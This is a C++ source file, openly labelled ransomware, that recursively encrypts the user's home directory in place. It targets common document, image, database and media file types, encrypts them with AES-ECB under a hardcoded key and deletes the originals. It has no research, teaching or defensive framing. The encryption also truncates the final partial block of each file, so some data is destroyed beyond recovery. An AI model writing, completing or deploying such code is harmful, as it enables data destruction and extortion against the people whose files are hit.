#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <filesystem>
#include <mbedtls/aes.h>

#define BUFFER_SIZE 4096

static std::string ransomware_extensions[] = {
    ".doc",
    ".docx",
    ".xls",
    ".xlsx",
    ".ppt",
    ".pptx",
    ".pdf",
    ".jpg",
    ".jpeg",
    ".png",
    ".txt",
    ".sql",
    ".mp3",
    ".mp4"
};

bool encrypt_file(const std::string& input_file_path, const std::string& key) {
    bool isEncryptable = false;
    for (const auto &extension : ransomware_extensions) {
        if (input_file_path.substr(input_file_path.length() - extension.length()) == extension) {
            isEncryptable = true;
            break;
        }
    } 
    if (isEncryptable) {
        // Open input file
        std::fstream input_file(input_file_path, std::ios::in | std::ios::binary);
        if (!input_file) {
            std::cerr << "Error: Could not open input file " << input_file_path << std::endl;
            return false;
        }

        // Open temporary output file
        std::ofstream temp_file(input_file_path + std::string(".tmp"), std::ios::out | std::ios::binary);
        if (!temp_file) {
            std::cerr << "Error: Could not create temporary output file " << input_file_path + std::string(".tmp") << std::endl;
            input_file.close();
            return false;
        }

        // Initialize AES context
        mbedtls_aes_context aes_ctx;
        mbedtls_aes_init(&aes_ctx);

        // Set key
        unsigned char key_bytes[32];
        std::memset(key_bytes, 0, sizeof(key_bytes));
        std::memcpy(key_bytes, key.c_str(), std::min(key.length(), sizeof(key_bytes)));
        mbedtls_aes_setkey_enc(&aes_ctx, key_bytes, 256);

        // Process input file in chunks
        unsigned char buffer[BUFFER_SIZE];
        std::streamsize bytes_read;
        while ((bytes_read = input_file.read((char*)buffer, sizeof(buffer)).gcount())) {
            // Encrypt buffer
            for (int i = 0; i < bytes_read; i += 16) {
                mbedtls_aes_crypt_ecb(&aes_ctx, MBEDTLS_AES_ENCRYPT, buffer + i, buffer + i);
            }

            // Write encrypted data to temporary output file
            temp_file.write((char*)buffer, bytes_read);
        }

        // Clean up
        mbedtls_aes_free(&aes_ctx);
        input_file.close();
        temp_file.close();

        // Replace input file with temporary output file
        if (std::remove(input_file_path.c_str()) != 0) {
            std::cerr << "Error: Could not remove input file " << input_file_path << std::endl;
            return false;
        }
        if (std::rename((input_file_path + std::string(".tmp")).c_str(), input_file_path.c_str()) != 0) {
            std::cerr << "Error: Could not rename temporary output file " << input_file_path + std::string(".tmp") << " to " << input_file_path << std::endl;
            return false;
        }

        return true;
    }
    return true;
}

bool encrypt_directory(const std::string& dir_path, const std::string& key) {
    for (const auto& entry : std::filesystem::directory_iterator(dir_path)) {
        if (entry.is_directory()) {
            // Recurse into subdirectory
            if (!encrypt_directory(entry.path().generic_string(), key)) {
                return false;
            }
        } else if (entry.is_regular_file()) {
            // Encrypt regular file
            if (!encrypt_file(entry.path().generic_string(), key)) {
                return false;
            }
        }
    }

    return true;
}

std::string get_home_directory() {
    const char* home_dir = nullptr;

    #if defined(_WIN32)
        home_dir = getenv("USERPROFILE");
    #else
        home_dir = getenv("HOME");
    #endif

    return home_dir ? std::string(home_dir) : "";
}

int main(int argc, char** argv) {
    if (!encrypt_directory(get_home_directory(), "123456789000000000")) {
        return 1;
    }
    return 0;
}